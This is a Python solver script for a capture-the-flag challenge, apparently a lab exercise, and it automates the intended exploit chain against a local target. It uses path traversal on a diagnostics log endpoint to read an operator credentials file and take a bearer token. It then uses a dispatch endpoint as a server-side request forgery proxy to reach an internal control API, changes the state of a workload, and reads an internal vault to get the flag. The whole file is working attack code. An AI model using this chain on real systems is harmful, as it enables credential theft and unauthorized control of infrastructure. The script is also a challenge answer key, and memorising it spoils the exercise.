#!/usr/bin/env python3
"""
Challenge X06: Doom's Control Plane - Autonomous Clean-Room Solver
Executes the intended exploit path:
1. Recovers scoped operator token via diagnostic path disclosure.
2. Discovers Control API & enumerates allowed authorization scopes.
3. Inspects isolated synthetic workload (sovereign-core-gateway).
4. Executes step-by-step workload transition (ISOLATED -> STANDBY -> SCALED -> ACTIVE).
5. Interacts with Sovereign Core Service to retrieve the flag.
"""

import json
import sys
import requests


def solve(target_url="http://127.0.0.1:80"):
    target_url = target_url.rstrip("/")
    print(f"[*] Targeting Doom's Control Plane at {target_url}")

    session = requests.Session()

    # Step 1: Recover scoped control credential from diagnostic logs
    print("[*] Step 1: Recovering scoped control credentials via diagnostic disclosure...")
    cred_url = f"{target_url}/api/diagnostics/log?file=../../credentials/operator_credentials.json"
    r = session.get(cred_url, timeout=5)
    if r.status_code != 200:
        print(f"[-] Failed to fetch credentials: HTTP {r.status_code} {r.text}")
        sys.exit(1)

    try:
        cred_json = json.loads(r.json().get("content", "{}"))
        token = cred_json.get("control_token")
        control_api_url = cred_json.get("control_plane_url", "http://127.0.0.1:8081")
        print(f"[+] Recovered Token: {token}")
        print(f"[+] Discovered Control Plane URL: {control_api_url}")
    except Exception as e:
        print(f"[-] Failed to parse operator credentials: {e}")
        sys.exit(1)

    if not token:
        print("[-] Control token is empty.")
        sys.exit(1)

    # Step 2: Enumerate capabilities & introspect token
    print("[*] Step 2: Introspecting token capabilities on Control API...")
    dispatch_url = f"{target_url}/api/mesh/dispatch"
    introspect_req = {
        "url": f"{control_api_url}/api/v1/auth/introspect",
        "method": "GET",
        "headers": {
            "Authorization": f"Bearer {token}"
        }
    }
    r = session.post(dispatch_url, json=introspect_req, timeout=5)
    if r.status_code != 200:
        print(f"[-] Token introspection failed: {r.text}")
        sys.exit(1)

    intro_data = r.json().get("response", {})
    print(f"[+] Token Identity: {intro_data.get('identity')} (Role: {intro_data.get('role')})")
    print(f"[+] Allowed Scopes: {intro_data.get('allowed_scopes')}")

    # Step 3: Inspect workloads
    print("[*] Step 3: Inspecting synthetic workloads...")
    workload_req = {
        "url": f"{control_api_url}/api/v1/workloads",
        "method": "GET",
        "headers": {
            "Authorization": f"Bearer {token}"
        }
    }
    r = session.post(dispatch_url, json=workload_req, timeout=5)
    workloads = r.json().get("response", {}).get("workloads", [])
    target_wl = next((w for w in workloads if w["name"] == "sovereign-core-gateway"), None)
    if not target_wl:
        print("[-] sovereign-core-gateway workload not found.")
        sys.exit(1)

    print(f"[+] Target Workload Found: {target_wl['name']} [State: {target_wl['state']}, Replicas: {target_wl['replicas']}]")

    # Step 4a: Transition workload to STANDBY
    print("[*] Step 4a: Transitioning workload ISOLATED -> STANDBY (prepare_maintenance)...")
    trans_req = {
        "url": f"{control_api_url}/api/v1/workloads/sovereign-core-gateway/transition",
        "method": "POST",
        "headers": {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        },
        "data": {
            "action": "prepare_maintenance"
        }
    }
    r = session.post(dispatch_url, json=trans_req, timeout=5)
    if r.status_code != 200:
        print(f"[-] Transition failed: {r.text}")
        sys.exit(1)
    print(f"[+] Transition Response: {r.json().get('response', {}).get('message')}")

    # Step 4b: Scale workload to 1 replica
    print("[*] Step 4b: Scaling workload to 1 replica...")
    scale_req = {
        "url": f"{control_api_url}/api/v1/workloads/sovereign-core-gateway/scale",
        "method": "POST",
        "headers": {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        },
        "data": {
            "replicas": 1
        }
    }
    r = session.post(dispatch_url, json=scale_req, timeout=5)
    if r.status_code != 200:
        print(f"[-] Scaling failed: {r.text}")
        sys.exit(1)
    print(f"[+] Scale Response: {r.json().get('response', {}).get('message')}")

    # Step 4c: Activate workload & bind internal mesh route
    print("[*] Step 4c: Activating workload and binding internal mesh route...")
    act_req = {
        "url": f"{control_api_url}/api/v1/workloads/sovereign-core-gateway/activate",
        "method": "POST",
        "headers": {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        },
        "data": {
            "target_state": "ACTIVE",
            "route": "internal_mesh"
        }
    }
    r = session.post(dispatch_url, json=act_req, timeout=5)
    if r.status_code != 200:
        print(f"[-] Activation failed: {r.text}")
        sys.exit(1)
    print(f"[+] Activation Response: {r.json().get('response', {}).get('message')}")

    # Step 5: Reach Sovereign Core Vault and retrieve flag
    print("[*] Step 5: Querying Sovereign Core Vault on http://127.0.0.1:8083/core/vault...")
    vault_req = {
        "url": "http://127.0.0.1:8083/core/vault",
        "method": "GET"
    }
    r = session.post(dispatch_url, json=vault_req, timeout=5)
    if r.status_code != 200:
        print(f"[-] Failed to access Core Vault: {r.text}")
        sys.exit(1)

    core_resp = r.json().get("response", {})
    flag = core_resp.get("flag", "")
    print(f"[+] Core Message: {core_resp.get('message')}")
    print(f"[+] FLAG: {flag}")

    if flag and flag.startswith("YUVA{"):
        print("[+] SOLVE SUCCESSFUL!")
        return flag
    else:
        print("[-] Invalid or missing flag.")
        sys.exit(1)


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:80"
    solve(url)
